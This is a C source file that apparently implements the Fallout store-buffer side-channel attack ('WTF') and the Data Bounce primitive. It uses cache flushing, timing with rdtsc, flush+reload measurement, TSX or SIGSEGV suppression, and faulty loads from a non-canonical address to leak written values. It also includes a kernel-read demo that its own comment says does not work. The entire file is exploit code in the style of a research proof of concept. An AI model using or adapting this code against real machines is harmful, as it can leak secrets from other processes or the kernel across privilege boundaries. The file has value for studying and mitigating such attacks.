#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>


uint64_t *wtf_times;
ssize_t page_size;
uint8_t *attacker_address = (uint8_t *) 0xFFFF000000000000ull, *address_padding = (uint8_t *) UINT64_MAX;
jmp_buf buf;


#ifdef TSX_AVAILABLE
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
    unsigned status;
    asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
    //asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
    return status == ~0u;
}
static __attribute__((always_inline)) inline void xend(void) {
    asm volatile("xend" ::: "memory");
    //asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}
#endif

static inline void flush(void *p) {
#ifdef __x86_64__
    asm volatile("clflush (%0)\n" : : "r"(p) : "rax");
#else
    asm volatile("clflush (%0)\n" : : "r"(p) : "eax");
#endif
}

static inline void flush_mem(void *mem) {
    int i = 0;
    for (; i < 256; i++) {
        flush(mem + page_size * i);
    }
    asm volatile("mfence");
}

static inline void maccess(void *p) {
#ifdef __x86_64__
    asm volatile("mov (%0), %%rax\n" : : "r"(p) : "rax");
#else
    asm volatile("movl (%0), %%eax\n" : : "r"(p) : "eax");
#endif
}

static inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
    asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
    asm volatile("rdtsc" : "=A"(a));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static inline void data_bounce_asm(void *ptr, void *mem, char success) {
    asm volatile("mfence");
#ifdef __x86_64__
    asm volatile("movq %%rcx, (%0)\n"\
                 "movq %%rdx, (%%rcx)\n"                                        \
                 "movq (%%rcx), %%rax\n"                                        \
                 "shl $12, %%rax\n"                                             \
                 "add %%rax, %%rbx\n"                                           \
                 "movq %%rbx, (%%rbx)\n"                                        \
                 :                                                              \
               : "c"(ptr), "b"(mem), "d"(success), "r"(NULL)        \
               : "rax");
#else
    asm volatile("mov (%0), %%eax\n"                                           \
                 "mov %%edx, (%%ecx)\n"                                        \
                 "mov (%%ecx), %%eax\n"                                        \
                 "shl $12, %%eax\n"                                            \
                 "add %%ebx, %%eax\n"                                          \
                 "mov %%eax, (%%eax)\n"                                        \
               :                                                               \
               : "c"(ptr), "b"(mem), "d"(success), "r"(NULL)                   \
               : "eax");
#endif
}

static inline uint64_t __attribute__((always_inline)) measure_flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    return end - start;
}

static inline uint64_t __attribute__((always_inline)) measure_access_time(void *ptr) {
    uint64_t start = 0, end = 0;
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    return end - start;
}


static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void) signum;
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}


static inline int get_min(uint64_t *buffer, int len) {
    int min_i = 0, i = 0;
    uint64_t min = UINT64_MAX;
    for (; i < len; i++) {
        if (buffer[i] < min) {
            min = buffer[i];
            min_i = i;
        }
    }
    return min_i;
}


/**
 * Perform a data bounce at a specified virtual address (for inline use)
 * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
 * @param ptr The address to perform the data bounce at
 * @return The entry with the lowest flush+reload time
 */
static inline int _data_bounce(void *mem, void *ptr, char success) {
    int i, min_i;
    if (!setjmp(buf)) {
        flush_mem(mem);
        data_bounce_asm(ptr, mem, success);
    }
    for (i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + (i << 12));
    }
    min_i = get_min(wtf_times, 256);
    return min_i;
}

/**
 * Perform a number of data bounces at a specified virtual address
 * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
 * @param ptr The address to perform the data bounce at
 * @param repeats How often to repeat the data bounce.
 * @return The number of successful data bounces
 */
int data_bounce(void *mem, void *ptr, int repeats) {
    int i, max_i = 0, max = 0, fts = 0;
    char magic_number = 42;
    int counts[256];
    memset(counts, 0, sizeof(counts[0]) * 256);
    for (i = 0; i < repeats; i++) {
        sched_yield();
        uint8_t result = (uint8_t) _data_bounce(mem, ptr, 42);
        counts[result]++;
        fts += result == 42;
        if(counts[result] > max){
            max = counts[result];
            max_i = result;
        }
    }
    return max_i == magic_number && counts[magic_number] > repeats / 6;
}

int flush_cache(void *mem) {
    flush_mem(mem);
}

#ifdef TSX_AVAILABLE
#define FALLOUT_FAULTY_LOAD if(xbegin()){maccess(mem + page_size * attacker_address[page_offset]);xend();}
#else
#define FALLOUT_FAULTY_LOAD if (!setjmp(buf)) maccess(mem + page_size * attacker_address[page_offset]);
#endif

/**
 * Use WTF to observe a write to the heap
 * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
 * @param page_offset The page offset of the write access to observe.
 * @param secret_value The secret value to be written
 * @return Was the read successful?
 */

int toy_wtf(void *mem, int page_offset, int secret_value) {
    uint8_t *test = aligned_alloc(page_size, page_size);
    flush_mem(mem);
    asm volatile("mfence");
    test[page_offset] = secret_value;
    FALLOUT_FAULTY_LOAD
    for (int i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    munmap(test, page_size);
    return get_min(wtf_times, 256) == secret_value;
}


/**
 * Attempts a WTF read (for inline use).
 * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
 * @param page_offset The page offset of the write access to observe.
 * @return The result of the attempted read
 */
static inline int _wtf(void *mem, int page_offset) {
    int i;
    FALLOUT_FAULTY_LOAD
    for (i = 0; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + i * page_size);
    }
    return get_min(wtf_times, 256);
}

/**
 * Attempts a WTF read.
 * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
 * @param page_offset The page offset of the write access to observe.
 * @return The result of the attempted read
 */

int wtf(void *mem, int page_offset) {
    return _wtf(mem, page_offset);
}

#ifdef TSX_AVAILABLE
#define FALLOUT_FAULTY_LOAD_K if(xbegin()){maccess(mem + (attacker_address[0xABC]<<12));xend();}
#else
#define FALLOUT_FAULTY_LOAD_K if (!setjmp(buf)) maccess(mem + (attacker_address[0xABC]<<12));
#endif

/**
 * WTF function for the kernel-read demo. It currently does not work :(
 * @param mem
 * @param procfile
 * @return
 */
int kernel_wtf(void *mem, int procfile) {
    unsigned int result, i = 0;
    unsigned char response[sizeof(unsigned int) + 2];
    memset(response, 0, sizeof(unsigned int) + 2);
    response[0] = 111;
    lseek(procfile, 0, SEEK_SET);
    flush_cache(mem);
    read(procfile, response, sizeof(unsigned int));
    FALLOUT_FAULTY_LOAD_K
    for (i = 1; i < 256; i++) {
        wtf_times[i] = measure_flush_reload(mem + (i << 12));
    }
    wtf_times[0] = INT64_MAX;
    result = get_min(wtf_times, 256);
    if (response[0] != 0) {
        printf("Error: The kernel-module's memory is not page aligned!\n");
        exit(1);
    }
    return result == 42;
}

/**
 * Init function, should be called before any other function from this file is used
 */
int fallout_init() {
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("%s", "Failed to setup signal handler\n");
        return 0;
    }
    page_size = getpagesize();
    wtf_times = malloc(sizeof(uint64_t) * 256);
    return 1;
}

/**
 * Cleanup function, should be called after use
 */
void fallout_cleanup() {
    free(wtf_times);
}
